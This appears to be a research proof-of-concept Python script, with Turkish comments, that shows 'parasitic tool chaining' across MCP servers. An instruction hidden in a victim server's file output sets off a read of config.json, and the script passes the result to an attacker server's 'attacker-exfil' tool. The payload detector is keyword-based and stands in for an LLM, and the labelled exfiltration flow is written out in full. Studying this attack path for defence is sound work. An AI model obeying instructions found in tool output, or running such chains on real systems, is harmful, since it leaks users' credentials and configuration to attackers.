"""
orchestrator.py — MCP-17 Parasitic Tool Chaining PoC Orchestrator
Araştırma: MCP-17 + MCP-36 kombinasyonu
Senaryo: Orchestrator hem victim hem attacker server'a bağlıdır.
         Victim server'dan gelen output'u işlerken, içindeki payload
         attacker server'ın tool'larını tetikler.

Kullanım:
    python3 orchestrator.py

Gereksinimler:
    pip install mcp anthropic

Not: Bu araştırma amaçlıdır. Kontrollü lab ortamında çalıştırınız.
"""

import asyncio
import json
import sys
from pathlib import Path
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

# ── Renkli terminal çıktısı ──────────────────────────────────────────────────
R = "\033[91m"  # kırmızı
G = "\033[92m"  # yeşil
Y = "\033[93m"  # sarı
B = "\033[94m"  # mavi
C = "\033[96m"  # cyan
W = "\033[97m"  # beyaz
X = "\033[0m"   # reset

def log(tag, msg, color=W):
    print(f"{color}[{tag}]{X} {msg}")

# ── Server parametreleri ─────────────────────────────────────────────────────
BASE = Path(__file__).parent / "servers"

VICTIM_PARAMS = StdioServerParameters(
    command="python3",
    args=[str(BASE / "victim_server.py")],
    env=None
)

ATTACKER_PARAMS = StdioServerParameters(
    command="python3",
    args=[str(BASE / "attacker_server.py")],
    env=None
)

# ── Tool çağrısı kayıt sistemi ───────────────────────────────────────────────
tool_call_log = []

def record_call(server, tool, args, result):
    entry = {"server": server, "tool": tool, "args": args, "result": result}
    tool_call_log.append(entry)
    return entry

# ── Basit payload parser — gerçek LLM yerine kural tabanlı ──────────────────
def parse_payload_from_output(text: str) -> dict | None:
    """
    Victim server output'unda gömülü talimat var mı kontrol eder.
    Gerçek saldırıda LLM bu parsing'i yapar — çok daha güçlü.
    Bu PoC'ta keyword matching kullanıyoruz.
    """
    if "attacker-exfil" in text or "SİSTEM TALİMATI" in text:
        return {"tool": "attacker-exfil", "triggered": True}
    if "analyze_data" in text.lower() and ("config" in text.lower() or "api_key" in text.lower()):
        return {"tool": "analyze_data", "triggered": True}
    return None

# ── Ana PoC akışı ────────────────────────────────────────────────────────────
async def run_poc():
    print(f"\n{C}{'='*60}{X}")
    print(f"{C}  MCP-17 Parasitic Tool Chaining — PoC v0.1{X}")
    print(f"{C}  Araştırma: Tool/Function Calling Exploitation{X}")
    print(f"{C}{'='*60}{X}\n")

    # Phase 1: Victim server'a bağlan
    log("PHASE 1", "Victim server'a bağlanılıyor...", B)
    async with stdio_client(VICTIM_PARAMS) as (victim_read, victim_write):
        async with ClientSession(victim_read, victim_write) as victim_session:
            await victim_session.initialize()
            log("OK", "Victim server bağlandı", G)

            # Victim tool'larını listele
            victim_tools = await victim_session.list_tools()
            log("INFO", f"Victim tools: {[t.name for t in victim_tools.tools]}", Y)

            # Phase 2: Attacker server'a bağlan
            log("PHASE 2", "Attacker server'a bağlanılıyor...", B)
            async with stdio_client(ATTACKER_PARAMS) as (atk_read, atk_write):
                async with ClientSession(atk_read, atk_write) as attacker_session:
                    await attacker_session.initialize()
                    log("OK", "Attacker server bağlandı", G)

                    attacker_tools = await attacker_session.list_tools()
                    log("INFO", f"Attacker tools: {[t.name for t in attacker_tools.tools]}", Y)

                    # Phase 3: Victim server'dan dosya oku
                    print()
                    log("PHASE 3", "Victim server'dan 'notes.txt' okunuyor...", B)
                    victim_result = await victim_session.call_tool(
                        "read_file", {"filename": "notes.txt"}
                    )
                    victim_output = victim_result.content[0].text
                    record_call("victim", "read_file", {"filename": "notes.txt"}, victim_output)
                    log("VICTIM OUTPUT", f"\n{victim_output}", W)

                    # Phase 4: Output'ta payload var mı?
                    print()
                    log("PHASE 4", "Output analiz ediliyor — payload tespiti...", B)
                    payload = parse_payload_from_output(victim_output)

                    if payload and payload["triggered"]:
                        log("ALERT", "⚠️  PAYLOAD TESPİT EDİLDİ — Parasitic chain tetikleniyor!", R)

                        # Phase 5: Victim'den config'i çek (saldırganın istediği veri)
                        log("PHASE 5", "Config dosyası çekiliyor...", B)
                        config_result = await victim_session.call_tool(
                            "read_file", {"filename": "config.json"}
                        )
                        stolen_data = config_result.content[0].text
                        record_call("victim", "read_file", {"filename": "config.json"}, stolen_data)
                        log("STOLEN", f"Çalınan veri: {stolen_data}", R)

                        # Phase 6: Attacker server'a exfiltrate et
                        print()
                        log("PHASE 6", "Attacker server'a exfiltration başlıyor...", R)
                        exfil_result = await attacker_session.call_tool(
                            "attacker-exfil", {"data": stolen_data}
                        )
                        record_call("attacker", "attacker-exfil", {"data": stolen_data}, exfil_result.content[0].text)
                        log("EXFIL", f"Attacker yanıtı: {exfil_result.content[0].text}", R)

                    else:
                        log("INFO", "Payload tespit edilmedi — temiz output", G)

    # Özet rapor
    print(f"\n{C}{'='*60}{X}")
    print(f"{C}  POC SONUÇ RAPORU{X}")
    print(f"{C}{'='*60}{X}")
    print(f"\nToplam tool çağrısı: {len(tool_call_log)}")
    for i, call in enumerate(tool_call_log, 1):
        server_color = R if call["server"] == "attacker" else G
        print(f"\n  {i}. {server_color}[{call['server'].upper()}]{X} → {call['tool']}")
        if call["server"] == "attacker":
            print(f"     Exfiltrate edilen veri boyutu: {len(str(call['args'].get('data', '')))} karakter")

    # Exfil log'unu göster
    exfil_path = Path("/tmp/attacker_exfil.log")
    if exfil_path.exists():
        print(f"\n{R}[EXFIL LOG] /tmp/attacker_exfil.log içeriği:{X}")
        print(exfil_path.read_text())

    print(f"\n{Y}[ARAŞTIRMA NOTU]{X}")
    print("Bu PoC, victim server output'una gömülü bir talimatın")
    print("attacker server'ın tool'larını nasıl tetikleyebildiğini gösterir.")
    print("MCP protokolü bu chain'i varsayılan olarak engellemez.")
    print(f"Tespit için bakılacak yer: /tmp/victim_access.log\n")

if __name__ == "__main__":
    asyncio.run(run_poc())
